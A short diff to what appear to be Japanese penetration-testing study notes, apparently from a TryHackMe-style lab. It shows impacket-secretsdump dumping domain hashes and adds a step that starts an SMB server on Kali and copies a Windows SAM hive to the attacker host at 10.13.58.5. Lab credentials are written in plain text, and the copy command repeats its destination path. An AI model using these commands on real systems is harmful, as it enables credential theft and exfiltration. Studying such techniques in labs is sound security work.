@@ -54,3 +54,12 @@ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorate
 ```
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
+
+9. SMBサーバとして起動する。
+```
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```  
+Kali側でサーバとして待ち受けてからWindwos側で以下みたいなコマンドをやるとファイルをコピーして送信できる。
+```
+copy C:\Users\THMBackup\sam.hive \\10.13.58.5\public\ \\10.13.58.5\public\ 
+```
